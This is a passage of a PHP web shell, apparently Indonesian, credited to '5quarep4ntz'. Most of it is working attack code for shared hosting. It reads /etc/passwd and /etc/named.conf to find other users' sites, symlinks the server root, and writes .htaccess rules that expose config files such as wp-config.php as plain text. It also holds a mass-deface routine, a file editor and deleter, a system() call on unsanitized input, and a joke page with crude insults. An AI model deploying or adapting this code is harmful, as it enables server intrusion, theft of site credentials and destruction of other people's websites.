					  bing("ip:$ip");
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">

					  </form></center>';
			}
		} else {
			echo "<pre>";
			$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font><br/>");
			while($passwd = fgets($etc)) {
				if($passwd == '' || !$etc) {
					echo "<font color=red>Can't read /etc/passwd</font><br/>";
				} else {
					preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
					foreach($user_jumping[1] as $user_pro_jump) {
						$user_jumping_dir = "/home/$user_pro_jump/public_html";
						if(is_readable($user_jumping_dir)) {
							$i++;
							$jrw = "[<font color=green>R</font>] <a href='?path=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
							if(is_writable($user_jumping_dir)) {
								$jrw = "[<font color=green>RW</font>] <a href='?path=$user_jumping_dir'><font color=#0046FF>$user_jumping_dir</font></a>";
							}
							echo $jrw;
							if(function_exists('posix_getpwuid')) {
								$domain_jump = file_get_contents("/etc/named.conf");
								if($domain_jump == '') {
									echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
									foreach($domains_jump[1] as $dj) {
										$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_jumping_url = $user_jumping_url['name'];
										if($user_jumping_url == $user_pro_jump) {
											echo " => ( <u>$dj</u> )<br>";
											break;
										}
									}
								}
							} else {
								echo "<br>";
							}
						}
					}
				}
			}
			if($i == 0) { 
			} else {
				echo "<br>Total ada ".$i." Kamar di ".$ip;
			}
			echo "</pre>";
		}
		echo "</div><br/>";
		exit;
	}


if($_GET['squr'] == 'sym') {
		if(!is_file('named.txt')){
			$d00m = @file("/etc/named.conf");
		}else{
			$d00m = @file("named.txt");
		}
		if(!$d00m) {
			die ("[ <a href='?option&path=$path&squr=symread'>Bypass Read</a> ] [ <a href='?option&path=$path&squr=sym_404'>Symlink 404</a> ] [ <a href='?option&path=$path&squr=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Error tidak dapat membaca  /etc/named.conf</font><br/><br/>");
		}
		else{
			echo "[ <a href='?option&path=$path&squr=symread'>Bypass Read</a> ] [ <a href='?option&path=$path&squr=sym_404'>Symlink 404</a> ] [ <a href='?option&path=$path&squr=sym_bypas'>Symlink Bypass</a> ]<div class='tmp'>
				<table align='center' width='100%'>
					<thead class='bg-info'>
						<th>Domains</th>
						<th>Users</th>
						<th>symlink </th>
					</thead>";
					foreach($d00m as $dom){
						if(eregi("zone",$dom)){
							preg_match_all('#zone "(.*)"#', $dom, $domsws);
							flush();
							if(strlen(trim($domsws[1][0])) > 2){
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domsws[1][0]));
								flush();
								$site = $user['name'] ;
								@symlink("/","sym/root");
								$site = $domsws[1][0];
								$ir = 'ir';
								$il = 'il';
								if (preg_match("/.^$ir/",$domsws[1][0]) or preg_match("/.^$il/",$domsws[1][0]) ) {
									$site = ".$domsws[1][0].";
								}
								echo "
								<tr>
									<td>
										<a target='_blank' href=http://www.".$domsws[1][0]."/>".$site." </a>
									</td>
									<td>
										".$user['name']."
									</td>
									<td>
										<a href='sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a>
									</td>
								</tr>";
								flush();
								flush();
							}
						}
					}
				echo "</table>
			</div><br/>";
		}
		exit;
	}

	if($_GET['squr'] == 'symread') {
		echo "read /etc/named.conf";
		echo "<form method='post' action='?option&path=$path&squr=symread&save=1'>
			<textarea style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;' rows='8' name='file'>";
			flush();
			flush();
			$file = '/etc/named.conf';
			$r3ad = @fopen($file, 'r');
			if ($r3ad){
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
		}else if (!$r3ad) {
			$r3ad = @show_source($file) ;
		}else if (!$r3ad) {
			$r3ad = @highlight_file($file);
		}else if (!$r3ad) {
			$sm = @symlink($file,'sym.txt');
			if ($sm){
				$r3ad = @fopen('sym/sym.txt', 'r');
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}
		}
		echo "</textarea><br/><input type='submit' class='btn btn-danger form-control' value='Save'/> </form>";
		if(isset($_GET['save'])){
			$cont = stripcslashes($_POST['file']);
			$f = fopen('named.txt','w');
			$w = fwrite($f,$cont);
			if($w){
				echo '<br/>save has been successfully';
			}
			fclose($f);
		}
		exit;
	}
	
	if ($_GET['squr'] == 'sym_404'){
		echo '<h2>Symlink 404</h2>
		<form method="post">
			File Target: <input type="text" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;" name="dir" value="/home/user/public_html/wp-config.php"><br>
			Save As: <input type="text" style="margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;" name="isi" placeholder="[Ex] file.txt"/><br/>
			<input type="submit" class="btn btn-danger btn-block" value="Execute" name="execute"/>
		</form>';
		if($_POST['execute']){
			rmdir("squr_sym404");
			mkdir("squr_sym404", 0777);
			$path = $_POST['path'];
			$isi = $_POST['isi'];
			system("ln -s ".$path."squr_sym404/".$isi);
			symlink($path,"squr_sym404/".$isi);
			$inija = fopen("squr_sym404/.htaccess", "w");
			fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
			echo'<a href="/squr_sym404/" target="_blank"> >>Sukses<< </a>';
		}
		exit;
	}
	
	
	if ($_GET['squr'] == 'sym_bypas'){
		if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){
			$cont = stripcslashes($_POST['file']);
			if(!file_exists('passwd.txt')){
				$f = @fopen('passwd.txt','w');
				$w = @fwrite($f,$cont);
				fclose($f);
			}
			if($w or @filesize('passwd.txt') > 0){
				echo "<div class='tmp mb-4'>
					<table width='100%'>
						<thead class='bg-info text-center'>
							<th>Users</th>
							<th>symlink</th>
							<th>FTP</th>
						</thead>";
						flush();
						$fil3 = file('passwd.txt');
						foreach ($fil3 as $f){
							$u=explode(':', $f);
							$user = $u['0'];
							echo "<tr class='text-dark'>
								<td class='text-left pl-1'>$user</td>
								<td>
									<a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>
								</td>
								<td>
									<a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>
								</td>
							</tr>";
					flush();
					flush();
				}
				die ("</tr></table></div>");
			}

		}

		echo "read /etc/passwd";
		echo "<br/><form method='post' action='?option&path=$path&squr=sym_bypas&save=1'>
			<textarea style='border:2px solid silver;background:transparent;outline:none;color:silver;' rows='10' cols='67' name='file'>";
				flush();
				$file = '/etc/passwd';
				$r3ad = @fopen($file, 'r');
				if ($r3ad){
					$content = @fread($r3ad, @filesize($file));
					echo "".htmlentities($content)."";
				}elseif(!$r3ad) {
					$r3ad = @show_source($file) ;
				}elseif(!$r3ad) {
					$r3ad = @highlight_file($file);
				}elseif(!$r3ad) {

					for($uid=0;$uid<1000;$uid++){
					$ara = posix_getpwuid($uid);
					if (!empty($ara)) {
						while (list ($key, $val) = each($ara)){
							print "$val:";
						}
						print "\n";
					}
				}
			}
			flush();
			echo "</textarea><br/>
			<input type='submit' class='btn btn-danger btn-block' value='Symlink'/><br/>
		</form>";
		flush();
		exit;
	}
	
	
	
 if($_GET['squr'] == 'mass') {
		
		function tipe_massal($dir,$namafile,$isi_script) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$lokasi = $dirc.'/'.$namafile;
					if($dirb === '.') {
						file_put_contents($lokasi, $isi_script);
					} elseif($dirb === '..') {
						file_put_contents($lokasi, $isi_script);
					} else {
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "Done > $lokasi\n";
								file_put_contents($lokasi, $isi_script);
								$masdef = tipe_massal($dirc,$namafile,$isi_script);
							}
						}
					}
				}
			}
		}
		
		function tipe_biasa($dir,$namafile,$isi_script) {
			if(is_writable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					$lokasi = $dirc.'/'.$namafile;
					if($dirb === '.') {
						file_put_contents($lokasi, $isi_script);
					} elseif($dirb === '..') {
						file_put_contents($lokasi, $isi_script);
					} else {
						if(is_dir($dirc)) {
							if(is_writable($dirc)) {
								echo "Done > $dirb/$namafile\n";
								file_put_contents($lokasi, $isi_script);
							}else{
								echo "<p>gagal</p>";
							}
						}
					}
				}
			}
		}
		
		if($_POST['start']) {
			echo "[ <a href='?path=$path'>Kembali</a> ]
			<textarea style='border:2px solid silver;background:transparent;outline:none;color:silver;' rows='10' cols='67' disabled=''>";
			if($_POST['tipe'] == 'mahal') {
				tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			} elseif($_POST['tipe'] == 'murah') {
				tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			}
		echo "</textarea><br/>";
		} else {
			echo "<form method='post'>
				<center>
					<h5>Tipe :</h5>
					<input id='toggle-on' name='tipe' value='murah' type='radio' checked>
					<label for='toggle-on'>Biasa</label>
					<input id='toggle-off' name='tipe' value='mahal' type='radio'>
					<label for='toggle-off'>Masal</label>
				</center>
				<h5> Lokasi :</h5>
				<input type='text' name='d_dir' value='$path' style='margin-top:4px;width:300px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;'><br>
				<h5>Nama File :</h5>
				<input type='text' name='d_file' autocomplete='off' placeholder='_.htm' style='margin-top:4px;width:300px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;'><br/>
				<h5>Isi File :</h5>
				<textarea name='script' style='border:2px solid silver;background:transparent;outline:none;color:silver;' rows='10' cols='67' autocomplete='off' placeholder='Hacked By 5quarep4ntz'></textarea><br/>
				<input type='submit' name='start' value='Mass Deface' class='btn btn-danger form-control'><br/>
			</form>";
		}
		exit;
	}
elseif($_GET['squr'] == 'about') {
echo '
	<center><br><br>
    <br><br>
            <br><h2>Contact : 5quarep4ntz@gmail.com<br>
intagram :<a href="https://www.instagram.com/hay_god45" target="_blank"> hay_god45</h2></center>
<br><br><br>';}
elseif($_GET['squr'] == 'santet') {
echo '
	<center>
<h3> - santet online coded by 5quarep4ntz - </h3><br><br>';
        echo "<center><form method='post'>
	      <font color='white' size='6px'>
         nama kamu : <br>
        <input type='text' style='width: 350px; height: 25px; color: silver; background:transparent; border: 2px dotted gold; padding: 5px; margin-left: 20px; text-align: left' name='nama' placeholder='5quarep4ntz'><br>
         nama yg mau di santet : <br>
        <input type='text' style='width: 350px; height: 25px; color: silver; background:transparent; border: 2px dotted gold; padding: 5px; margin-left: 20px; text-align: left' name='mel' placeholder='kontol'><br>
          tipe santet </font>
         <select style='margin-top:6px;width:150px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid gold;border-radius:5px'>
         <option value=''>pilih</option>
         <option value=''>isi paku</option>
         <option value=''>matane picek</option>
         <option value=''>aboh kontole</option>
         <option value=''>langsung mati</option>
         </select><br><br><br>
        <input type='submit' name='santet' value='SANTET' style='margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:transparent;color:white;border:2px solid red;border-radius:5px'/>";
        if(isset($_POST['santet'])) {
        echo '
	<center><br><br>
    <br><img border="0" src="https://i.ibb.co/mBDJM91/hantu-pocong.jpg" width="350" height="">
            <br><h3>awokwok goblok........!</h3></center>
<br><br><br>';}}


elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">EDIT SUCCES<br/>';
echo "[ <a href='?path=$path'>Kembali</a> ]";
}else{
echo '<script> alert("EDIT GAGAL !!!!!")</script></font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea class="potext" cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" style="margin-top:4px;width:500px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid silver;border-radius:5px"/>
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<script> alert("SUCCES !!!!!")</script><br/>';
}else{
echo '<font color="red">Directory Gagal Terhapus om                                                                                                                                                                                                                                                                                           </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<script> alert("SUCCES !!!!!")</script><br/>';
}else{
echo '<font color="red">File Gagal Dihapus om</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="960" border="2" cellpadding="3" cellspacing="0" align="center">
<tr class="first">
<td><center><font color="black">N4m3</peller></center></td>
<td><center><font color="black">S1z3</peller></center></td>
<td><center><font color="black">P3rm15ion</peller></center></td>
<td><center><font color="black">4ct1on</peller></center></td>
</tr>';
foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr class="s_tb">
<td><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="aqua">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid gold;border-radius:5px">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">RenaMe</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid gold;border-radius:5px">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr class="s_tb">
<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII="> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="aqua">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid gold;border-radius:5px">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:gold;border:2px solid gold;border-radius:5px">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow: 0 0 20px blue, 0 0 5px blue, 0 0 7px blue, 0 0 45px blue; font-weight:bold: blue; font-size:35px">recoded by 5quarep4ntz</center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>